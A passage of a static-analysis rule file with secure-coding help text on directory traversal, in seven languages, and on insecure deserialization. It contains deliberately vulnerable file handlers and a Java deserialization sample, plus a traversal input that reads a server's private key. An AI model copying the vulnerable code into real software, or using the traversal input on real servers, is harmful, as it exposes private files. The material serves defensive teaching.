\"application/pdf\", menu);\n    }\n\n\nHere the name of the menu corresponds to a file on disk, which is being passed in the query string parameter. An \nattacker can set this menu parameter to anything they choose, and use the ../ syntax to access other directories. In \nfact, the URL /menus?menu=../certs/key.pem will let them download the server's private key kept in a directory next \nto the menus.\n\nIf you take file paths from the HTTP request, make sure to strip any characters that can be used in files paths, such as \n/, .., \\ and~. These characters vary by operating system and can be encoded in subtle ways, so it's generally \nbest to use a method like Path.GetFileName that strips any potential directory\ncomponents from a path. That only leaves ., .. and the empty string as\nspecial cases that could lead to unexpected behavior:\n\ncsharp\n    [HttpGet(\"menus\")]\n    public IActionResult SaferFileDownload([FromQuery] string menu)\n    {\n        string baseName = System.IO.Path.GetFileName(menu);\n        if (baseName != \"\" && baseName != \".\" && baseName != \"..\") {\n            byte[] fileBytes    = System.IO.File.ReadAllBytes(\"Static/menus/\" + baseName);\n\n            return File(fileBytes, \"application/pdf\", menu);\n        } else {\n            return Forbid();\n        }\n    }\n\n\nIn most web-servers you can have the server take care of this for you. The following snipped shows how to use the \nASP.NET Core Static File Middleware to safely mount the /Static/Menus directory as static content:\n\ncsharp\n  // This method gets called by the runtime. Use this method to configure the HTTP request pipeline.\n  public void Configure(IApplicationBuilder app, IWebHostEnvironment env)\n  {\n      if (env.IsDevelopment())\n      {\n          app.UseDeveloperExceptionPage();\n          app.UseMigrationsEndPoint();\n      }\n      else\n      {\n          app.UseExceptionHandler(\"/Home/Error\");\n          app.UseHsts();\n      }\n      \n      app.UseHttpsRedirection();\n      \n      // Mount the standard 'wwwroot' directory so files are accessible over HTTP.\n      app.UseStaticFiles();\n      \n      // Mount the local 'static/menus' directory so files are accessible over HTTP under the '/menus' path.\n      app.UseStaticFiles(new StaticFileOptions\n      {\n          FileProvider = new PhysicalFileProvider(Path.Combine(env.ContentRootPath, \"Static/Menus\")),\n          RequestPath = \"/menus\"\n      });\n      \n      app.UseRouting();\n\n      app.UseEndpoints(endpoints =>\n      {\n          endpoints.MapControllerRoute(\n              name: \"default\",\n              pattern: \"{controller=Home}/{action=Index}/{id?}\");\n          endpoints.MapRazorPages();\n      });\n   } \n\n\n:::\n\n:::tab[JavaScript]\n\n## Directory Traversal in JavaScript\n\nPassing file paths in URLs is dangerous. Consider the following Express application that hosts menus for a restaurant:\n\njavascript\nconst express = require('express')\nconst app     = express()\n\napp.get('/', (request, response) => {\n  response.send(\n    <div>\n       <h1>Click on a menu to download it</h1>\n       <p><a href=\"/menu?menu=breakfast.pdf\"> Breakfast </a></p>\n       <p><a href=\"/menu?menu=lunch.pdf\">     Lunch     </a></p>\n       <p><a href=\"/menu?menu=dinner.pdf\">    Dinner    </a></p>\n     </div>)\n})\n\nconst path = require('path')\n\napp.get('/menu', (request, response) => {\n\n  /**\n   * Taking the unfiltered filename from the HTTP request is dangerous -\n   * an attacker can use the \"../\" syntax in a filename to climb out of\n   * the intended directory.\n   */\n  const menuPath = path.resolve('menus/', request.query.menu)\n\n  response.download(menuPath)\n})\n\n\nHere the name of the menu corresponds to a file on disk, which is being passed in the query string parameter. An \nattacker can set this menu parameter to anything they choose, and use the ../ syntax to access other directories. In \nfact, the URL /menus?menu=../certs/key.pem will let them download the server's private key kept in a directory next \nto the menus.\n\nIf you take file paths from the HTTP request, make sure to strip any characters that can be used in files paths, such as \n/, .., \\ and~. These characters vary by operating system and can be encoded in subtle ways, so it's generally \nbest to disallow *all* non-alphanumeric characters:\n\njavascript\napp.get('/menu', (request, response) => {\n\n  /**\n   * Removing anything except alphanumeric characters (excluding the extension) will\n   * stop access to arbitrary directories.\n   */\n  const suppliedFilename = request.query.menu\n  const match            = suppliedFilename.match(/([a-z0-9]+)\\.([a-z]+)/i)\n  const scrubbedFileName = match[1] + '.' + match[2]\n\n  const menuPath = 'menus/' + scrubbedFileName\n\n  response.download(menuPath)\n})\n\n\nIn Express, you can have the server take care of this for you. The following code mounts the /menus directory as\nstatic content safely:\n\njavascript\nconst express = require('express')\nconst app     = express()\n\napp.get('/', (request, response) => {\n  response.send(\n    <div>\n       <h1>Click on a menu to download it</h1>\n       <p><a href=\"/menu/breakfast.pdf\"> Breakfast </a></p>\n       <p><a href=\"/menu/lunch.pdf\">     Lunch     </a></p>\n       <p><a href=\"/menu/dinner.pdf\">    Dinner    </a></p>\n     </div>)\n})\n\n// Tell Express that the /menu directory contains static files that should be made\n// available to the browser.\napp.use('/menu', express.static('menus'))\n\n\n:::\n\n:::tab[Python]\n\n## Directory Traversal in Python\n\nPassing file paths in URLs is dangerous. Consider the following Flask application that hosts menus for a restaurant:\n\npython\n@app.route('/menus')\ndef download_menu():\n  \"\"\"An insecure static file handler that allows directory traversal attacks.\"\"\"\n\n  filename         = request.args.get('menu')\n  static_directory = os.fspath(app.menu_folder)\n\n  # The construction of the path here is incredibly insecure!\n  # If a path contains the \"..%2F\" pattern, it will be treated as\n  # ../ and a hacker can climb out of the static directory.\n  filename = posixpath.join(static_directory, filename)\n\n  return send_file(filename)\n\n\nHere the name of the menu corresponds to a file on disk, which is being passed in the query string parameter. An \nattacker can set this menu parameter to anything they choose, and use the ../ syntax to access other directories. In \nfact, the URL /menus?menu=../certs/key.pem will let them download the server's private key kept in a directory next \nto the menus.\n\nIf you can avoid it, it's preferable to not rely on user input for file names: just\nuse a unique name generated on the server-side instead. This could e.g. be a\ndatabase primary key, or a unique token generated with secrets.token_urlsafe(32).\n\nIf you take file paths from the HTTP request, make sure to strip any characters that can be used in files paths.\nThe easiest way to achieve that is with functions such as os.path.basename.\nHowever, that would still let through special file names . and .., for which\nwe add special treatment:\n\npython\nimport os.path\n\n@app.route('/menus')\ndef download_menu():\n  \"\"\"An more secure file handler does not allow directory traversal attacks.\"\"\"\n\n  filename         = request.args.get('menu')\n  safe_filename    = os.path.basename(filename)\n  if safe_filename == '..' or safe_filename == '.':\n    raise Exception(\"path traversal\")\n\n  static_directory = os.fspath(app.menu_folder)\n  filename         = os.path.join(static_directory, safe_filename)\n\n  return send_file(filename)\n\n\nIn most web-servers you can have the server take care of this for you. The following function safely mounts \nthe /var/etc/menus directory as static content using the Flask web-server:\n\npython\n@app.route('/menus/<path:path>')\ndef download_menu(path):\n    return send_from_directory('/var/etc/menus', path)\n\n\n:::\n\n:::tab[Scala]\n\n## Directory Traversal in Scala\n\nPassing file paths in URLs is dangerous. Consider the following Scala application that hosts menus for a restaurant:\n\nscala\ndef getMenu = Action { request =>\n  val menu = request.getQueryString(\"menu\")\n\n  if (menu.isEmpty) {\n    Redirect(\"/menus\")\n  }\n  else {\n    Ok.sendFile(new java.io.File(s\"/var/etc/menus/${menu.get}\"))\n  }\n}\n\n\nHere the name of the menu corresponds to a file on disk, which is being passed in the query string parameter. An \nattacker can set this menu parameter to anything they choose, and use the ../ syntax to access other directories. In \nfact, the URL /menus?menu=../certs/key.pem will let them download the server's private key kept in a directory next \nto the menus.\n\nIf you take file paths from the HTTP request, make sure to strip any characters that can be used in files paths, such as \n/, .., \\ and~. These characters vary by operating system and can be encoded in subtle ways, so it's generally \nbest to disallow *all* non-alphanumeric characters:\n\nscala\ndef getMenu = Action { request =>\n  val menu = request.getQueryString(\"menu\")\n\n  if (menu.isEmpty) {\n    Redirect(\"/menus\")\n  }\n  else {\n    val safeFilename = menu.get.replaceAll(\"[^a-zA-Z0-9\\\\.]\",\"\")\n    Ok.sendFile(new java.io.File(s\"/var/etc/menus/${safeFilename}\"))\n  }\n}\n\n\nIn most web-servers you can have the server take care of this for you. The following configuration safely mounts \nthe /var/etc/menus directory as static content using the Assets controller of the Play framework:\n\n\nGET /menus/*menu controllers.Assets.at(path=\"/var/etc/menus\", menu)\n\n\n:::\n\n:::tab[Go]\n\n## Directory Traversal in Go\n\nPassing file paths in URLs is dangerous. Consider the following Go application that hosts menus for a restaurant:\n\ngo\n// An insecure static file handler that allows directory traversal attacks.\nfunc MenuFileHandler(response http.ResponseWriter, request *http.Request) {\n  fileName := request.URL.Query().Get(\"menu\")\n\n  file, err := os.Open(staticFolder + fileName)\n\n  if err != nil {\n    http.Error(response, \"Error opening file\", http.StatusInternalServerError)\n    return\n  }\n\n  defer file.Close()\n\n  response.Header().Set(\"Content-Type\", \"application/pdf\")\n\n  io.Copy(response, file)\n}\n\n\nHere the name of the menu corresponds to a file on disk, which is being passed in the query string parameter. An \nattacker can set this menu parameter to anything they choose, and use the ../ syntax to access other directories. In \nfact, the URL /menus?menu=../certs/key.pem will let them download the server's private key kept in a directory next \nto the menus.\n\nIf you take file paths from the HTTP request, make sure to strip any characters that can be used in files paths, such as \n/, .., \\ and~. These characters vary by operating system and can be encoded in subtle ways, so it's generally \nbest to use a method like filepath.Base that strips any potential directory\ncomponents from a path. That only leaves ., / and .. as special cases that could lead to unexpected behavior:\n\ngo\n// A more secure file handler does not allow directory traversal attacks.\nfunc MenuFileHandler0(response http.ResponseWriter, request *http.Request) {\n  fileName := filepath.Base(request.URL.Query().Get(\"menu\"))\n  if fileName == \".\" || fileName == \"/\" || fileName == \"..\" {\n    http.Error(response, \"Forbidden\", http.StatusForbidden)\n    return\n  }\n\n  file, err := os.Open(staticFolder + fileName)\n\n  if err != nil {\n    http.Error(response, \"Error opening file\", http.StatusInternalServerError)\n    return\n  }\n\n  defer file.Close()\n\n  response.Header().Set(\"Content-Type\", \"application/pdf\")\n\n  io.Copy(response,\n\n\nIn most web-servers you can have the server take care of this for you. The following function safely mounts \na configurable directory as static content using the Gorilla web framework:\n\ngo\nfunc main() {\n  var dir string\n\n  flag.StringVar(&dir, \"dir\", \".\", \"the directory to serve files from. Defaults to the current dir\")\n  flag.Parse()\n  router := mux.NewRouter()\n\n  // This will serve files under http://localhost:8000/static/<filename>\n  router.PathPrefix(\"/static/\").Handler(http.StripPrefix(\"/static/\", http.FileServer(http.Dir(dir))))\n\n  server := &http.Server{\n    Handler: router,\n    Addr:    \"127.0.0.1:8000\"\n  }\n\n  server.ListenAndServe()\n}\n\n\n:::\n\n:::tab[PHP]\n\n## Directory Traversal in PHP\n\nAllowing direct file references through user inputs can expose your application to Directory Traversal attacks. Consider this PHP script that fetches restaurant menus:\n\nphp\n$menuDirectory = \"/var/etc/menus\";\n$fileName = $_GET['menu'];\n\nheader(\"Content-Type: application/pdf\");\nheader(\"Content-Disposition: attachment; filename={$fileName}\");\n\n$file = $menuDirectory . DIRECTORY_SEPARATOR . $fileName;\nreadfile($file);\n\n\nHere, the menu's filename is directly taken from the query string parameter. An attacker can manipulate this parameter, using patterns like ../, to navigate out of the intended directory and access unintended files.\n\n## Mitigation\n\n1. **Input Sanitization**: Drop any directory references within filenames\n   received from the outside:\n\nphp\n$fileName = basename($_GET['menu']);\n\n\n2. **Opaque File References**: Instead of direct file references, consider using an array or database of approved filenames, or encode actual file references, ensuring users can't directly specify paths. \n\n:::\n\n::::\n\n## Other Considerations\n\nIf your website is handling a lot of static documents, consider using or integrating a third-party *Content Management\nSystem* (CMS). These will generate secure paths for documents as they are uploaded and allow fine-grained permissions\nto be set.\n\n## Additional information\n\n**[CWE-22](https://cwe.mitre.org/data/definitions/22.html)**\n\n**[OWASP-A5](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A5-Broken_Access_Control)**.",
                "markdown": "Attacker-Controlled input data is used as part of a file path to write a file without escaping or validation. This indicates a directory traversal vulnerability.\n\n# Directory Traversal\n\n**Directory traversal** vulnerabilities allow attackers to access arbitrary files on your server by manipulating HTTP\nparameters to include relative path syntax. It is important that you treat any parameters used to refer to files\nsecurely, or an attacker will be able to read sensitive data from your file system. Even better, avoid direct references\nto filenames altogether and use opaque identifiers and indirection instead.\n\n::::tabs\n\n:::tab[Java]\n\nPassing file paths in URLs is dangerous. Consider the following Java application that hosts menus for a restaurant:\n\n```java\npublic class UnsafeFileDownloadServlet\n{\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException\n    {\n        /**\n         * Taking the unfiltered filename from the HTTP request is dangerous -\n         * an attacker can use the \"../\" syntax in a filename to climb out of\n         * the intended directory.\n         */\n        final String fileName      = request.getParameter(\"menu\");\n        final String menuDirectory = \"/var/etc/menus\";\n\n        response.setContentType(\"application/pdf\");\n        response.setHeader(\"Content-disposition\", \"attachment; filename=\" + fileName);\n\n        try (OutputStream out = response.getOutputStream()) {\n            File file = new File(menuDirectory + File.separator + fileName);\n            Files.copy(file.toPath(), out);\n        }\n    }\n}\n```\n\nHere the name of the menu corresponds to a file on disk, which is being passed in the query string parameter. An \nattacker can set this `menu` parameter to anything they choose, and use the `../` syntax to access other directories. In \nfact, the URL `/menus?menu=../certs/key.pem` will let them download the server's private key kept in a directory next \nto the menus.\n\nIf you take file paths from the HTTP request, make sure to strip any characters that can be used in files paths, such as \n`/`, `..`, `\\`. These characters vary by operating system and can be encoded in subtle ways, so it's generally \nbest to use a method like `FilenameUtils.getBaseName` that strips any potential directory\ncomponents from a path. That only leaves `.`, `..` and the empty string as\nspecial cases that could lead to unexpected behavior:\n\n```java\nimport org.apache.commons.io.FilenameUtils;\n\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException\n    {\n        /**\n         * Removing anything except alphanumeric characters (and periods) will\n         * stop access to arbitrary directories.\n         */\n        final String fileName      = request.getParameter(\"menu\");\n        final String safeFileName  = FilenameUtils.getBaseName(fileName);\n        final String menuDirectory = \"/var/etc/menus\";\n\n\tif (\"\".equals(safeFileName) || \".\".equals(safeFileName) || \"..\".equals(safeFileName)) {\n\t    throw new SystemException(\"refusing to read a special directory name\");\n\t}\n\n        response.setContentType(\"application/pdf\");\n        response.setHeader(\"Content-disposition\", \"attachment; filename=\" + safeFileName);\n\n        try (OutputStream out = response.getOutputStream()) {\n            File file = new File(menuDirectory + File.separator + safeFileName);\n            Files.copy(file.toPath(), out);\n        }\n    }\n}\n```\n\nIn Java web applications you can have the server take care of this for you. The following configuration safely mounts \nthe `/var/etc/menus` directory as static content in a Jetty web-server:\n\n```xml\n<Configure class=\"org.eclipse.jetty.server.handler.ContextHandler\">\n  <Set name=\"contextPath\">/menus</Set>\n  <Set name=\"handler\">\n    <New class=\"org.eclipse.jetty.server.handler.ResourceHandler\">\n      <Set name=\"resourceBase\">/var/etc/menus</Set>\n      <Set name=\"directoriesListed\">false</Set>\n    </New>\n  </Set>\n</Configure>\n\n```\n\n:::\n\n:::tab[C#]\n\n## Directory Traversal in C#\n\nPassing file paths in URLs is dangerous. Consider the following ASP.NET Core controller method that hosts menus for a \nrestaurant:\n\n```csharp\n    [HttpGet(\"menus\")]\n    public IActionResult UnsafeFileDownload([FromQuery] string menu)\n    {\n        byte[] fileBytes = System.IO.File.ReadAllBytes(\"Static/menus/\" + menu);\n        return File(fileBytes, \"application/pdf\", menu);\n    }\n```\n\nHere the name of the menu corresponds to a file on disk, which is being passed in the query string parameter. An \nattacker can set this `menu` parameter to anything they choose, and use the `../` syntax to access other directories. In \nfact, the URL `/menus?menu=../certs/key.pem` will let them download the server's private key kept in a directory next \nto the menus.\n\nIf you take file paths from the HTTP request, make sure to strip any characters that can be used in files paths, such as \n`/`, `..`, `\\` and`~`. These characters vary by operating system and can be encoded in subtle ways, so it's generally \nbest to use a method like `Path.GetFileName` that strips any potential directory\ncomponents from a path. That only leaves `.`, `..` and the empty string as\nspecial cases that could lead to unexpected behavior:\n\n```csharp\n    [HttpGet(\"menus\")]\n    public IActionResult SaferFileDownload([FromQuery] string menu)\n    {\n        string baseName = System.IO.Path.GetFileName(menu);\n        if (baseName != \"\" && baseName != \".\" && baseName != \"..\") {\n            byte[] fileBytes    = System.IO.File.ReadAllBytes(\"Static/menus/\" + baseName);\n\n            return File(fileBytes, \"application/pdf\", menu);\n        } else {\n            return Forbid();\n        }\n    }\n```\n\nIn most web-servers you can have the server take care of this for you. The following snipped shows how to use the \nASP.NET Core Static File Middleware to safely mount the `/Static/Menus` directory as static content:\n\n```csharp\n  // This method gets called by the runtime. Use this method to configure the HTTP request pipeline.\n  public void Configure(IApplicationBuilder app, IWebHostEnvironment env)\n  {\n      if (env.IsDevelopment())\n      {\n          app.UseDeveloperExceptionPage();\n          app.UseMigrationsEndPoint();\n      }\n      else\n      {\n          app.UseExceptionHandler(\"/Home/Error\");\n          app.UseHsts();\n      }\n      \n      app.UseHttpsRedirection();\n      \n      // Mount the standard 'wwwroot' directory so files are accessible over HTTP.\n      app.UseStaticFiles();\n      \n      // Mount the local 'static/menus' directory so files are accessible over HTTP under the '/menus' path.\n      app.UseStaticFiles(new StaticFileOptions\n      {\n          FileProvider = new PhysicalFileProvider(Path.Combine(env.ContentRootPath, \"Static/Menus\")),\n          RequestPath = \"/menus\"\n      });\n      \n      app.UseRouting();\n\n      app.UseEndpoints(endpoints =>\n      {\n          endpoints.MapControllerRoute(\n              name: \"default\",\n              pattern: \"{controller=Home}/{action=Index}/{id?}\");\n          endpoints.MapRazorPages();\n      });\n   } \n```\n\n:::\n\n:::tab[JavaScript]\n\n## Directory Traversal in JavaScript\n\nPassing file paths in URLs is dangerous. Consider the following Express application that hosts menus for a restaurant:\n\n```javascript\nconst express = require('express')\nconst app     = express()\n\napp.get('/', (request, response) => {\n  response.send(\n    `<div>\n       <h1>Click on a menu to download it</h1>\n       <p><a href=\"/menu?menu=breakfast.pdf\"> Breakfast </a></p>\n       <p><a href=\"/menu?menu=lunch.pdf\">     Lunch     </a></p>\n       <p><a href=\"/menu?menu=dinner.pdf\">    Dinner    </a></p>\n     </div>`)\n})\n\nconst path = require('path')\n\napp.get('/menu', (request, response) => {\n\n  /**\n   * Taking the unfiltered filename from the HTTP request is dangerous -\n   * an attacker can use the \"../\" syntax in a filename to climb out of\n   * the intended directory.\n   */\n  const menuPath = path.resolve('menus/', request.query.menu)\n\n  response.download(menuPath)\n})\n```\n\nHere the name of the menu corresponds to a file on disk, which is being passed in the query string parameter. An \nattacker can set this `menu` parameter to anything they choose, and use the `../` syntax to access other directories. In \nfact, the URL `/menus?menu=../certs/key.pem` will let them download the server's private key kept in a directory next \nto the menus.\n\nIf you take file paths from the HTTP request, make sure to strip any characters that can be used in files paths, such as \n`/`, `..`, `\\` and`~`. These characters vary by operating system and can be encoded in subtle ways, so it's generally \nbest to disallow *all* non-alphanumeric characters:\n\n```javascript\napp.get('/menu', (request, response) => {\n\n  /**\n   * Removing anything except alphanumeric characters (excluding the extension) will\n   * stop access to arbitrary directories.\n   */\n  const suppliedFilename = request.query.menu\n  const match            = suppliedFilename.match(/([a-z0-9]+)\\.([a-z]+)/i)\n  const scrubbedFileName = match[1] + '.' + match[2]\n\n  const menuPath = 'menus/' + scrubbedFileName\n\n  response.download(menuPath)\n})\n```\n\nIn Express, you can have the server take care of this for you. The following code mounts the `/menus` directory as\nstatic content safely:\n\n```javascript\nconst express = require('express')\nconst app     = express()\n\napp.get('/', (request, response) => {\n  response.send(\n    `<div>\n       <h1>Click on a menu to download it</h1>\n       <p><a href=\"/menu/breakfast.pdf\"> Breakfast </a></p>\n       <p><a href=\"/menu/lunch.pdf\">     Lunch     </a></p>\n       <p><a href=\"/menu/dinner.pdf\">    Dinner    </a></p>\n     </div>`)\n})\n\n// Tell Express that the /menu directory contains static files that should be made\n// available to the browser.\napp.use('/menu', express.static('menus'))\n```\n\n:::\n\n:::tab[Python]\n\n## Directory Traversal in Python\n\nPassing file paths in URLs is dangerous. Consider the following Flask application that hosts menus for a restaurant:\n\n```python\n@app.route('/menus')\ndef download_menu():\n  \"\"\"An insecure static file handler that allows directory traversal attacks.\"\"\"\n\n  filename         = request.args.get('menu')\n  static_directory = os.fspath(app.menu_folder)\n\n  # The construction of the path here is incredibly insecure!\n  # If a path contains the \"..%2F\" pattern, it will be treated as\n  # ../ and a hacker can climb out of the static directory.\n  filename = posixpath.join(static_directory, filename)\n\n  return send_file(filename)\n```\n\nHere the name of the menu corresponds to a file on disk, which is being passed in the query string parameter. An \nattacker can set this `menu` parameter to anything they choose, and use the `../` syntax to access other directories. In \nfact, the URL `/menus?menu=../certs/key.pem` will let them download the server's private key kept in a directory next \nto the menus.\n\nIf you can avoid it, it's preferable to not rely on user input for file names: just\nuse a unique name generated on the server-side instead. This could e.g. be a\ndatabase primary key, or a unique token generated with `secrets.token_urlsafe(32)`.\n\nIf you take file paths from the HTTP request, make sure to strip any characters that can be used in files paths.\nThe easiest way to achieve that is with functions such as `os.path.basename`.\nHowever, that would still let through special file names `.` and `..`, for which\nwe add special treatment:\n\n```python\nimport os.path\n\n@app.route('/menus')\ndef download_menu():\n  \"\"\"An more secure file handler does not allow directory traversal attacks.\"\"\"\n\n  filename         = request.args.get('menu')\n  safe_filename    = os.path.basename(filename)\n  if safe_filename == '..' or safe_filename == '.':\n    raise Exception(\"path traversal\")\n\n  static_directory = os.fspath(app.menu_folder)\n  filename         = os.path.join(static_directory, safe_filename)\n\n  return send_file(filename)\n```\n\nIn most web-servers you can have the server take care of this for you. The following function safely mounts \nthe `/var/etc/menus` directory as static content using the Flask web-server:\n\n```python\n@app.route('/menus/<path:path>')\ndef download_menu(path):\n    return send_from_directory('/var/etc/menus', path)\n```\n\n:::\n\n:::tab[Scala]\n\n## Directory Traversal in Scala\n\nPassing file paths in URLs is dangerous. Consider the following Scala application that hosts menus for a restaurant:\n\n```scala\ndef getMenu = Action { request =>\n  val menu = request.getQueryString(\"menu\")\n\n  if (menu.isEmpty) {\n    Redirect(\"/menus\")\n  }\n  else {\n    Ok.sendFile(new java.io.File(s\"/var/etc/menus/${menu.get}\"))\n  }\n}\n```\n\nHere the name of the menu corresponds to a file on disk, which is being passed in the query string parameter. An \nattacker can set this `menu` parameter to anything they choose, and use the `../` syntax to access other directories. In \nfact, the URL `/menus?menu=../certs/key.pem` will let them download the server's private key kept in a directory next \nto the menus.\n\nIf you take file paths from the HTTP request, make sure to strip any characters that can be used in files paths, such as \n`/`, `..`, `\\` and`~`. These characters vary by operating system and can be encoded in subtle ways, so it's generally \nbest to disallow *all* non-alphanumeric characters:\n\n```scala\ndef getMenu = Action { request =>\n  val menu = request.getQueryString(\"menu\")\n\n  if (menu.isEmpty) {\n    Redirect(\"/menus\")\n  }\n  else {\n    val safeFilename = menu.get.replaceAll(\"[^a-zA-Z0-9\\\\.]\",\"\")\n    Ok.sendFile(new java.io.File(s\"/var/etc/menus/${safeFilename}\"))\n  }\n}\n```\n\nIn most web-servers you can have the server take care of this for you. The following configuration safely mounts \nthe `/var/etc/menus` directory as static content using the `Assets` controller of the Play framework:\n\n```\nGET /menus/*menu controllers.Assets.at(path=\"/var/etc/menus\", menu)\n```\n\n:::\n\n:::tab[Go]\n\n## Directory Traversal in Go\n\nPassing file paths in URLs is dangerous. Consider the following Go application that hosts menus for a restaurant:\n\n```go\n// An insecure static file handler that allows directory traversal attacks.\nfunc MenuFileHandler(response http.ResponseWriter, request *http.Request) {\n  fileName := request.URL.Query().Get(\"menu\")\n\n  file, err := os.Open(staticFolder + fileName)\n\n  if err != nil {\n    http.Error(response, \"Error opening file\", http.StatusInternalServerError)\n    return\n  }\n\n  defer file.Close()\n\n  response.Header().Set(\"Content-Type\", \"application/pdf\")\n\n  io.Copy(response, file)\n}\n```\n\nHere the name of the menu corresponds to a file on disk, which is being passed in the query string parameter. An \nattacker can set this `menu` parameter to anything they choose, and use the `../` syntax to access other directories. In \nfact, the URL `/menus?menu=../certs/key.pem` will let them download the server's private key kept in a directory next \nto the menus.\n\nIf you take file paths from the HTTP request, make sure to strip any characters that can be used in files paths, such as \n`/`, `..`, `\\` and`~`. These characters vary by operating system and can be encoded in subtle ways, so it's generally \nbest to use a method like `filepath.Base` that strips any potential directory\ncomponents from a path. That only leaves `.`, `/` and `..` as special cases that could lead to unexpected behavior:\n\n```go\n// A more secure file handler does not allow directory traversal attacks.\nfunc MenuFileHandler0(response http.ResponseWriter, request *http.Request) {\n  fileName := filepath.Base(request.URL.Query().Get(\"menu\"))\n  if fileName == \".\" || fileName == \"/\" || fileName == \"..\" {\n    http.Error(response, \"Forbidden\", http.StatusForbidden)\n    return\n  }\n\n  file, err := os.Open(staticFolder + fileName)\n\n  if err != nil {\n    http.Error(response, \"Error opening file\", http.StatusInternalServerError)\n    return\n  }\n\n  defer file.Close()\n\n  response.Header().Set(\"Content-Type\", \"application/pdf\")\n\n  io.Copy(response,\n```\n\nIn most web-servers you can have the server take care of this for you. The following function safely mounts \na configurable directory as static content using the Gorilla web framework:\n\n```go\nfunc main() {\n  var dir string\n\n  flag.StringVar(&dir, \"dir\", \".\", \"the directory to serve files from. Defaults to the current dir\")\n  flag.Parse()\n  router := mux.NewRouter()\n\n  // This will serve files under http://localhost:8000/static/<filename>\n  router.PathPrefix(\"/static/\").Handler(http.StripPrefix(\"/static/\", http.FileServer(http.Dir(dir))))\n\n  server := &http.Server{\n    Handler: router,\n    Addr:    \"127.0.0.1:8000\"\n  }\n\n  server.ListenAndServe()\n}\n```\n\n:::\n\n:::tab[PHP]\n\n## Directory Traversal in PHP\n\nAllowing direct file references through user inputs can expose your application to Directory Traversal attacks. Consider this PHP script that fetches restaurant menus:\n\n```php\n$menuDirectory = \"/var/etc/menus\";\n$fileName = $_GET['menu'];\n\nheader(\"Content-Type: application/pdf\");\nheader(\"Content-Disposition: attachment; filename={$fileName}\");\n\n$file = $menuDirectory . DIRECTORY_SEPARATOR . $fileName;\nreadfile($file);\n```\n\nHere, the menu's filename is directly taken from the query string parameter. An attacker can manipulate this parameter, using patterns like `../`, to navigate out of the intended directory and access unintended files.\n\n## Mitigation\n\n1. **Input Sanitization**: Drop any directory references within filenames\n   received from the outside:\n\n```php\n$fileName = basename($_GET['menu']);\n```\n\n2. **Opaque File References**: Instead of direct file references, consider using an array or database of approved filenames, or encode actual file references, ensuring users can't directly specify paths. \n\n:::\n\n::::\n\n## Other Considerations\n\nIf your website is handling a lot of static documents, consider using or integrating a third-party *Content Management\nSystem* (CMS). These will generate secure paths for documents as they are uploaded and allow fine-grained permissions\nto be set.\n\n## Additional information\n\n**[CWE-22](https://cwe.mitre.org/data/definitions/22.html)**\n\n**[OWASP-A5](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A5-Broken_Access_Control)**."
              },
              "name": "DirectoryTraversal",
              "properties": {
                "tags": [
                  "ng-sast"
                ],
                "precision": "very-high"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "fullDescription": {
                "text": "Attacker-Controlled input data is used as part of a file path to write a file without escaping or validation. This indicates a directory traversal vulnerability."
              },
              "helpUri": "https://docs.shiftleft.io/ngsast/product-info/coverage#vulnerabilities",
              "shortDescription": {
                "text": "Directory Traversal"
              }
            },
            {
              "id": "deserialization-attacker-controlled",
              "help": {
                "text": "Attacker-controlled data is deserialized. This indicates an insecure deserialization vulnerability.\n\n# Insecure Deserialization\n\n*Serialization* describes the process of writing in-memory code object to a binary form, typically for storage to disk\nor transmission across a network. *Deserialization* is the opposite process: transforming incoming binary data into\nan in-memory code object. If your code uses deserialization, you need to ensure it is not deserializing untrusted input:\nthe presents an opportunity for an attacker to inject malicious code into your web-server at runtime.\n\n::::tabs\n\n:::tab[Java]\n\nJava objects can be serialized into a stream of bytes using the java.io.ObjectOutputStream class. Most built-in Java\nclasses are serializable, and you can customize how your own classes are serialized by implementing the \njava.io.Serialazable interface, and, if needs be, writing your own serialization code.\n\nSerialization is used during *Remote Method Invocation* (RMI) calls, and provides an easy way to store data structures \nto disk for later us. However, if you unserialize data coming from an untrusted source - like binary data attached to an\nHTTP request - this gives an attacker an opportunity to inject malicious code directly into your Java runtime.\n\njava\npublic class DeserializationServlet extends HttpServlet\n{\n    protected void service(HttpServletRequest request, HttpServletResponse response) throws IOException\n    {\n        try {\n            ServletInputStream stream       = request.getInputStream();\n            ObjectInputStream  objectStream = new ObjectInputStream(stream);\n\n            // This object is taken from an untrusted source and is potentially malicious.\n            Object deserialized = objectStream.readObject();\n        }\n        catch (ClassNotFoundException ex) {\n\n        }\n    }\n}\n\n\n## Mitigation\n\nThe easiest way to avoid deserialization vulnerabilities is to avoid using serialization altogether. If you need to \naccept structured data from an HTTP request, XML or JSON are more common formats and less prone to malicious use.\n\nIf you *do* use serialization, ensure your byte streams come from a trusted source, deserialize to an expected form,\nand cannot be tampered with. Your code should make assertions about the class of each object as it is deserialized, as\na way of reducing the attack surface:\n\njava\nServletInputStream stream = request.getInputStream();\n            \n// Restricting the classes we deserialize to reduces the risk.\nObjectInputStream objectStream = new ObjectInputStream(stream) {\n    protected Class<?> resolveClass(ObjectStreamClass osc) throws IOException, ClassNotFoundException {\n        if (!osc.getName().equals(java.util.HashMap.class.getName())) {\n            throw new InvalidClassException(\"Unexpected class\", osc.getName());\n        }\n        \n        return super.resolveClass(osc);\n    }\n};\n\nObject deserialized = objectStream.readObject();\n\n\nTo detect tampering, you can generate a digital signature when you write out a byte stream for later use, then verify\nthat signature when reading the objects back in:\n\njava\n/**\n * Generate a digital signature for some binary data, so we can verify it has not\n * been tampered with if it is returned from an untrusted source.\n */\npublic static String signData(byte[] data) throws Exception\n{\n    KeyPair keyPair = getKeyPair();\n\n    Signature signature = Signature.getInstance(\"SHA1WithRSA\");\n    signature.initSign(keyPair.getPrivate());\n    signature.update(data);\n\n    byte[] bytes = signature.sign();\n    \n    return Base64.getEncoder().encodeToString(bytes);\n}\n\n\n:::\n\n:::tab[C#]\n\n## Serialization in C#\n\nThere is a number of ways to serialize data in ASP.NET: the BinaryFormatter can serializes and deserializes an object,\nor an entire graph of connected objects, in binary format. There are also a number of other serializers with more \nspecific uses:\n\n* System.Runtime.Serialization.Formatters.Soap.SoapFormatter - for serialization to and from SOAP format.\n* System.Runtime.Serialization.NetDataContractSerializer - for serialization to and from XML format.\n* System.Web.UI.ObjectStateFormatter - used for page state persistence.\n* System.Web.UI.LosFormatter - serializes the view state for a Web Forms page.\n\nEach of these allow an attacker 